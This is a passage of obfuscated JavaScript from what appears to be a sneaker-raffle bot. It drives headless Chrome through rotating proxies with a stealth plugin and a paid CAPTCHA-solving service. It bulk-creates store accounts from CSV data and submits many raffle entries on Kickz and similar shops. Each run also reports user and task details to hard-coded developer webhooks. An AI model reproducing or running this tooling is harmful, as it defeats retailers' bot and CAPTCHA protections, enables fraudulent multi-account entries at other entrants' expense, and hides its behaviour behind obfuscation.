            }), await _0x1842f7['goto'](_0x3f24bb, { 'waitUntil': 'networkidle2' }), console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x1842f7['waitForTimeout'](0xfa0), console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Cookies\x20received'), await _0x1842f7['waitForTimeout'](0x320);
            if (_0x167aa3[_0x11e3bb]['Size'] == 'RANDOM') {
                console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x5cac45 = await _0x1842f7['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x4e309e => {
                    return _0x4e309e['map'](_0x1da856 => _0x1da856['href']);
                });
                var _0x16cf9e = Math['round'](Math['random']() * (_0x5cac45['length'] - 0x1));
                await _0x1842f7['goto']('' + _0x5cac45[_0x16cf9e]);
            } else {
                console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x167aa3[_0x11e3bb]['Size']);
                try {
                    const _0x1bc9fe = await _0x1842f7['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x167aa3[_0x11e3bb]['Size'] + '\x22]\x20>\x20a', _0xdc1ffc => {
                        return _0xdc1ffc['map'](_0x28b4ae => _0x28b4ae['href']);
                    });
                    await _0x1842f7['goto']('' + _0x1bc9fe[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0xd642ee) {
                    console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20' + _0xd642ee + '\x20Size\x20not\x20found')), _0x4af4a4 = 'Size\x20Not\x20Found';
                    var _0x27a022 = await _0x2463d6(_0x167aa3[_0x11e3bb], _0xa52a35, 'dev', !![], _0x4af4a4);
                    _0x5d6489['errorDEV'] = { 'embeds': [_0x27a022] };
                    _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x5d6489['errorDEV']);
                    await _0x31fc49(_0x344612, _0x5d6489['errorDEV']);
                    continue;
                }
            }
            await _0x1842f7['waitForTimeout'](0x258), await _0x1842f7['type']('#raffle-instagram', '' + _0x167aa3[_0x11e3bb]['Follower'], { 'delay': 0x64 }), await _0x1842f7['waitForTimeout'](0x384), await _0x1842f7['click']('#raffle-terms'), await _0x1842f7['waitForTimeout'](0x384), await _0x1842f7['evaluate'](() => {
                const _0x2f262d = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x2f262d['click']();
            }), await _0x1842f7['waitForTimeout'](0xbb8), await _0x1842f7['waitForSelector']('#checkout_email'), await _0x29ac01(0x3e8), console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Filling\x20Information');
            _0x30c63d == 'sec' ? await _0x1842f7['type']('#checkout_email', '' + _0x167aa3[_0x11e3bb]['FirstName'] + _0x167aa3[_0x11e3bb]['LastName'] + _0x2cde8d['catchall'], 0x32) : await _0x1842f7['type']('#checkout_email', '' + _0x167aa3[_0x11e3bb]['Email'], 0x32);
            await _0x29ac01(0x320), await _0x1842f7['select']('#checkout_shipping_address_country', '' + _0x167aa3[_0x11e3bb]['Country']), await _0x1842f7['waitForTimeout'](0x258), await _0x1842f7['type']('#checkout_shipping_address_first_name', '' + _0x167aa3[_0x11e3bb]['FirstName']), await _0x1842f7['waitForTimeout'](0x320), await _0x1842f7['type']('#checkout_shipping_address_last_name', '' + _0x167aa3[_0x11e3bb]['LastName']), await _0x1842f7['waitForTimeout'](0x2bc), await _0x1842f7['type']('#checkout_shipping_address_address1', _0x167aa3[_0x11e3bb]['Address1'] + '\x20' + _0x167aa3[_0x11e3bb]['HouseNumber']), await _0x1842f7['waitForTimeout'](0x2bc), await _0x1842f7['type']('#checkout_shipping_address_address2', '' + _0x167aa3[_0x11e3bb]['Address2']), await _0x1842f7['waitForTimeout'](0x2bc);
            _0x167aa3[_0x11e3bb]['Postcode'] == undefined ? await _0x1842f7['type']('#checkout_shipping_address_zip', '' + _0x167aa3[_0x11e3bb]['Zip']) : await _0x1842f7['type']('#checkout_shipping_address_zip', '' + _0x167aa3[_0x11e3bb]['Postcode']);
            await _0x1842f7['waitForTimeout'](0x2bc), await _0x1842f7['type']('#checkout_shipping_address_city', '' + _0x167aa3[_0x11e3bb]['City']), await _0x1842f7['waitForTimeout'](0x2bc), console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x1842f7, _0x1842f7['evaluate'](() => {
                const _0x2201bb = document['querySelector']('#continue_button');
                for (var _0x1aa5c0 = 0x0; _0x1aa5c0 < 0x5; _0x1aa5c0++) {
                    if (_0x2201bb) {
                        _0x2201bb['click'](), _0x2201bb['click']();
                        break;
                    } else
                        _0x29ac01(0xfa0);
                }
            }), await _0x1842f7['waitForTimeout'](0x1194);
            try {
                await _0x1842f7['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x1842f7['evaluate'](() => {
                const _0x1a850f = document['querySelector']('#continue_button');
                for (var _0x2fd783 = 0x0; _0x2fd783 < 0x5; _0x2fd783++) {
                    if (_0x1a850f) {
                        _0x1a850f['click']();
                        break;
                    } else
                        _0x29ac01(0xfa0);
                }
            }), await _0x1842f7['waitForTimeout'](0x7d0), console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1842f7['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x1842f7['evaluate'](() => {
                const _0x1c786b = document['querySelector']('#continue_button');
                for (var _0x167b22 = 0x0; _0x167b22 < 0x5; _0x167b22++) {
                    if (_0x1c786b) {
                        _0x1c786b['click']();
                        break;
                    } else
                        _0x29ac01(0xfa0);
                }
            }), await _0x1842f7['waitForTimeout'](0x1194), await _0x1842f7['waitForSelector']('#continue_button'), _0x1842f7['evaluate'](() => {
                const _0x2f2461 = document['querySelector']('#continue_button');
                for (var _0x98240d = 0x0; _0x98240d < 0x5; _0x98240d++) {
                    if (_0x2f2461) {
                        _0x2f2461['click']();
                        break;
                    } else
                        _0x29ac01(0xfa0);
                }
            });
            try {
                await _0x1842f7['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x2cb418 = 'no', _0x4cb72b(_0x167aa3[_0x11e3bb], _0xa52a35), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '')
                    try {
                        await _0x31fc49(_0x2cde8d['webhook'], _0x5d6489['succesDEVMSG']);
                    } catch {
                    }
                await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x5d6489['succesDEVMSG']), await _0x29ac01(0xc8);
                try {
                    await _0x31fc49(_0x5bae61, _0x5d6489['succesPUBMSG']);
                } catch {
                }
            } catch (_0x4b0c50) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x4b0c50));
            }
        } catch (_0x1a05c5) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20' + _0x1a05c5)), _0x4af4a4 = '' + _0x1a05c5;
            var _0x27a022 = await _0x2463d6(_0x167aa3[_0x11e3bb], _0xa52a35, 'dev', !![], _0x4af4a4);
            _0x5d6489['errorDEV'] = { 'embeds': [_0x27a022] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x5d6489['errorDEV']), await _0x31fc49(_0x344612, _0x5d6489['errorDEV']), _0x2cb418 = 'yes';
        } finally {
            _0x44cb89 && _0x44cb89['close']();
            if (_0x2cb418 == 'yes' && _0x5c9c02 != 0x5 && _0x4af4a4 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Retrying')), _0x11e3bb = _0x11e3bb - 0x1, _0x5c9c02 = _0x5c9c02 + 0x1;
                continue;
            }
            _0x2cb418 == 'yes' && _0x5c9c02 >= 0x5 && (_0x29520a(_0x167aa3[_0x11e3bb], _0xa52a35), _0x2cb418 = 'no', _0x5c9c02 = 0x0);
            if (_0x11e3bb + 0x1 == _0x167aa3['length']) {
                console['log'](_0x3e6680['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x29ac01(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x2cde8d['AfewDelay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['AfewDelay']);
        }
    }
};
async function _0x4b5fdb(_0xcc5a44, _0x2ffe1d, _0x4c61dc, _0x27462e) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x506723 = 0x0; _0x506723 < _0x4c61dc['length']; _0x506723++) {
        if (_0x43ce2c != 'yes')
            var _0x43ce2c = '', _0x2a513c = 0x0;
        _0x757e32(_0x2ffe1d['name'] + '\x20Task\x20' + (_0x506723 + 0x1) + '\x20/\x20' + _0x4c61dc['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x4c61dc, _0x506723);
        var _0x32f6f9 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x582dcf
                }
            ]
        }];
        const _0x2c209d = { 'embeds': _0x32f6f9 };
        var _0x536160 = await _0x2463d6(_0x4c61dc[_0x506723], _0x2ffe1d, 'acc', ![]);
        const _0x1e294f = { 'succesDEVMSG': { 'embeds': [_0x536160] } };
        if (_0x4c61dc[_0x506723]['Email'] == '' || _0x4c61dc[_0x506723]['FirstName'] == '' || _0x4c61dc[_0x506723]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x4c61dc[_0x506723]['Password'] == '' && (_0x4c61dc[_0x506723]['Password'] = 'JRaffles23!');
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x2f5ed8 = _0x27462e[_0x506723]['split'](':');
        else
            var _0x557727 = Math['round'](Math['random']() * (_0x27462e['length'] - 0x1)), _0x2f5ed8 = _0x27462e[_0x557727]['split'](':');
        const _0x2f1d44 = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x2f5ed8[0x0] + ':' + _0x2f5ed8[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x53d467 = await _0x2f1d44['newPage']();
            await _0x53d467['authenticate']({
                'username': '' + _0x2f5ed8[0x2],
                'password': '' + _0x2f5ed8[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x53d467['setRequestInterception'](!![]), _0x53d467['on']('request', _0x31d544 => {
                _0x31d544['resourceType']() === 'image' || _0x31d544['resourceType']() === 'font' || _0x31d544['resourceType']() === 'media' ? _0x31d544['abort']() : _0x31d544['continue']();
            }), await _0x53d467['goto'](_0xcc5a44), await _0x29ac01(0xbb8), console['log'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x53d467['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x53d467['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x53d467['waitForSelector']('#button-register'), await _0x29ac01(0x7d0), await _0x53d467['evaluate'](() => {
                const _0xa2e8b0 = document['querySelector']('#button-register');
                _0xa2e8b0['click']();
            }), console['log'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x29ac01(0x1388), await _0x53d467['waitForSelector']('#customer_salutation'), await _0x53d467['select']('#customer_salutation', 'mr'), await _0x29ac01(0x7d0), await _0x53d467['waitForSelector']('#customer_firstname'), await _0x53d467['type']('#customer_firstname', '' + _0x4c61dc[_0x506723]['FirstName']), await _0x29ac01(0x352), await _0x53d467['waitForSelector']('#customer_lastname'), await _0x53d467['type']('#customer_lastname', '' + _0x4c61dc[_0x506723]['LastName']), await _0x29ac01(0x352), await _0x53d467['type']('#email-input', '' + _0x4c61dc[_0x506723]['Email']), await _0x29ac01(0x352), await _0x53d467['type']('#email-confirm-input', '' + _0x4c61dc[_0x506723]['Email']), await _0x29ac01(0x352), await _0x53d467['type']('#register-password', '' + _0x4c61dc[_0x506723]['Password']), await _0x29ac01(0x352), await _0x53d467['type']('#password-confirm', '' + _0x4c61dc[_0x506723]['Password']), await _0x29ac01(0x352), console['log'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x53d467['click']('#consent'), await _0x29ac01(0x1f4);
            const _0x10131a = await _0x53d467['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x10131a) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x53d467['click']('#buttonRegister');
            try {
                await _0x53d467['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Account\x20' + _0x4c61dc[_0x506723]['Email'] + '\x20Generated!')), console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x4c61dc[_0x506723]['Email'])), await _0x29ac01(0x4b0);
            async function _0x330280() {
                console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x17f9ec = await _0x205687['get']('Code');
                return _0x17f9ec['Code'];
            }
            ;
            code = await _0x330280(), _0x29ac01(0x320), console['log'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Verifying..'), await _0x53d467['type']('#verificationCode', code), await _0x29ac01(0x1f4), await _0x53d467['click']('#buttonVerify'), await _0x29ac01(0x190), await _0x53d467['click']('#buttonVerify'), await _0x29ac01(0x3e8);
            try {
                await _0x53d467['waitForSelector']('div.b-user_greeting'), _0x43ce2c = 'no', console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Account\x20' + _0x4c61dc[_0x506723]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x45be1e['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x4c61dc[_0x506723]['Email'] + ',' + _0x4c61dc[_0x506723]['Password'] + ','), console['log'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Account\x20' + _0x4c61dc[_0x506723]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x1e294f['succesDEVMSG']);
                } catch {
                }
                await _0x31fc49(_0x201dd3, _0x1e294f['succesDEVMSG']);
            } catch {
                _0x43ce2c = 'no', console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0xdb9d66) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20' + _0xdb9d66)), _0x32f6f9[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x32f6f9[0x0]['description'] = '' + _0xdb9d66, await _0x31fc49(_0x344612, _0x2c209d), _0x43ce2c = 'yes';
        } finally {
            _0x2f1d44 && _0x2f1d44['close']();
            if (_0x43ce2c == 'yes' && _0x2a513c != 0x5) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2ffe1d['name'] + ']\x20Task\x20' + (_0x506723 + 0x1) + '\x20:\x20Retrying')), _0x506723 = _0x506723 - 0x1, _0x2a513c = _0x2a513c + 0x1;
                continue;
            }
            _0x43ce2c == 'yes' && _0x2a513c >= 0x5 && (_0x29520a(_0x4c61dc[_0x506723], _0x2ffe1d), _0x43ce2c = 'no', _0x2a513c = 0x0), console['log']('Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x27e569(_0x18c8af, _0x361d1e, _0x26c70e) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x471434 = 0x0; _0x471434 < _0x361d1e['length']; _0x471434++) {
        var _0x398554;
        if (_0x277484 != 'yes')
            var _0x277484 = '', _0x3deb96 = 0x0;
        _0x757e32(_0x18c8af['name'] + '\x20Task\x20' + (_0x471434 + 0x1) + '\x20/\x20' + _0x361d1e['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83);
        var _0x455f7e = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Product',
                    'value': '' + _0x361d1e[_0x471434]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x361d1e[_0x471434]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x582dcf
                }
            ]
        }], _0x23bd8b = await _0x2463d6(_0x361d1e[_0x471434], _0x18c8af, 'dev', ![]), _0x42245e = await _0x2463d6(_0x361d1e[_0x471434], _0x18c8af, 'pub', ![]);
        const _0x2b36d9 = {
            'succesDEVMSG': { 'embeds': [_0x23bd8b] },
            'succesPUBMSG': { 'embeds': [_0x42245e] }
        };
        await _0x43304e(_0x361d1e, _0x471434);
        if (_0x361d1e[_0x471434]['Email'] == '' || _0x361d1e[_0x471434]['Password'] == '' || _0x361d1e[_0x471434]['FirstName'] == '' || _0x361d1e[_0x471434]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x3b47bb = _0x26c70e[_0x471434]['split'](':');
        else
            var _0x58036e = Math['round'](Math['random']() * (_0x26c70e['length'] - 0x1)), _0x3b47bb = _0x26c70e[_0x58036e]['split'](':');
        const _0x1eeb26 = await _0x149082['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3b47bb[0x0] + ':' + _0x3b47bb[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2d1a0f = await _0x1eeb26['newPage']();
            await _0x2d1a0f['authenticate']({
                'username': '' + _0x3b47bb[0x2],
                'password': '' + _0x3b47bb[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d1a0f['setRequestInterception'](!![]), _0x2d1a0f['on']('request', _0x2fd5ce => {
                _0x2fd5ce['resourceType']() === 'image' || _0x2fd5ce['resourceType']() === 'font' || _0x2fd5ce['resourceType']() === 'media' ? _0x2fd5ce['abort']() : _0x2fd5ce['continue']();
            }), await _0x2d1a0f['goto']('' + _0x361d1e[_0x471434]['Url'], { 'waitUntil': 'networkidle2' }), await _0x29ac01(0x12c);
            try {
                await _0x2d1a0f['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x2d1a0f['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Logging\x20in'), await _0x2d1a0f['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2d1a0f['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2d1a0f['waitForSelector']('#username'), await _0x2d1a0f['type']('#username', _0x361d1e[_0x471434]['Email']), await _0x2d1a0f['waitForSelector']('#password'), await _0x2d1a0f['type']('#password', _0x361d1e[_0x471434]['Password']), await _0x29ac01(0x190), await _0x2d1a0f['click']('#buttonSubmit'), await _0x2d1a0f['waitForSelector']('div.b-user_greeting'), console['log'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x29ac01(0x1f4), await _0x2d1a0f['goto']('' + _0x361d1e[_0x471434]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x361d1e[_0x471434]['Size']);
            let _0x1a1c3c = _0x361d1e[_0x471434]['Size']['replace']('.5', '\x201/2');
            await _0x2d1a0f['click']('button[title=\x22' + _0x1a1c3c + '\x22]'), await _0x29ac01(0x1f4);
            try {
                await _0x2d1a0f['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x29ac01(0x12c), console['log'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2d1a0f['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x29ac01(0x12c), await _0x2d1a0f['type']('#dwfrm_raffle_addressFields_firstName', _0x361d1e[_0x471434]['FirstName']), await _0x29ac01(0x12c), await _0x2d1a0f['type']('#dwfrm_raffle_addressFields_lastName', _0x361d1e[_0x471434]['LastName']), await _0x29ac01(0x12c), await _0x2d1a0f['select']('#dwfrm_raffle_addressFields_country', _0x361d1e[_0x471434]['Country']), await _0x29ac01(0x12c), await _0x2d1a0f['type']('#dwfrm_raffle_addressFields_city', _0x361d1e[_0x471434]['City']), await _0x29ac01(0x12c);
            _0x361d1e[_0x471434]['Postcode'] == undefined && (_0x361d1e[_0x471434]['Postcode'] = _0x361d1e[_0x471434]['Zip']);
            await _0x2d1a0f['type']('#dwfrm_raffle_addressFields_postalCode', _0x361d1e[_0x471434]['Postcode']), await _0x29ac01(0x12c), await _0x2d1a0f['type']('#dwfrm_raffle_addressFields_address1', _0x361d1e[_0x471434]['Address1']), await _0x29ac01(0x12c), await _0x2d1a0f['type']('#dwfrm_raffle_addressFields_address2', _0x361d1e[_0x471434]['HouseNumber']), await _0x29ac01(0x12c), await _0x2d1a0f['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x361d1e[_0x471434]['Address2']), await _0x29ac01(0x12c), await _0x2d1a0f['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x29ac01(0x12c), await _0x2d1a0f['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x361d1e[_0x471434]['Follower']), await _0x29ac01(0x1f4), await _0x2d1a0f['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x29ac01(0x1f4), console['log'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20' + _0x3e6680['blue']('Awaiting\x20Paypal\x20Payment')), await _0x2d1a0f['click']('.b-paypal_button');
            try {
                await _0x2d1a0f['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x277484 = 'no', _0x4cb72b(_0x361d1e[_0x471434], _0x18c8af), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x2b36d9['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x2b36d9['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x5bae61, _0x2b36d9['succesPUBMSG']);
            } catch (_0x4c90f2) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4c90f2)), _0x398554 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4c90f2;
                var _0x4a30ac = await _0x2463d6(_0x361d1e[_0x471434], _0x18c8af, 'dev', !![], _0x398554);
                _0x2b36d9['errorDEV'] = { 'embeds': [_0x4a30ac] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x2b36d9['errorDEV']), await _0x31fc49(_0x344612, _0x2b36d9['errorDEV']);
            }
        } catch (_0x49716e) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20' + _0x49716e)), _0x398554 = '' + _0x49716e;
            var _0x4a30ac = await _0x2463d6(_0x361d1e[_0x471434], _0x18c8af, 'dev', !![], _0x398554);
            _0x2b36d9['errorDEV'] = { 'embeds': [_0x4a30ac] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x2b36d9['errorDEV']), await _0x31fc49(_0x344612, _0x2b36d9['errorDEV']), _0x277484 = 'yes';
        } finally {
            _0x1eeb26 && _0x1eeb26['close']();
            if (_0x277484 == 'yes' && _0x3deb96 != 0x5) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x18c8af['name'] + ']\x20Task\x20' + (_0x471434 + 0x1) + '\x20:\x20Retrying')), _0x471434 = _0x471434 - 0x1, _0x3deb96 = _0x3deb96 + 0x1;
                continue;
            }
            _0x277484 == 'yes' && _0x3deb96 >= 0x5 && (_0x29520a(_0x361d1e[_0x471434], _0x18c8af), _0x277484 = 'no', _0x3deb96 = 0x0), console['log']('Waiting\x20for\x20' + _0x2cde8d['AfewDelay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['AfewDelay']);
        }
    }
}
async function _0x50f023(_0x483451, _0x525a66) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x356c89 = 0x0; _0x356c89 < bouncewear['length']; _0x356c89++) {
        await _0x43304e(bouncewear, _0x356c89);
        if (bouncewear[_0x356c89]['Email'] == '' || bouncewear[_0x356c89]['Password'] == '' || bouncewear[_0x356c89]['FirstName'] == '' || bouncewear[_0x356c89]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x393e08 = _0x3e167a()[_0x356c89]['split'](':');
        else
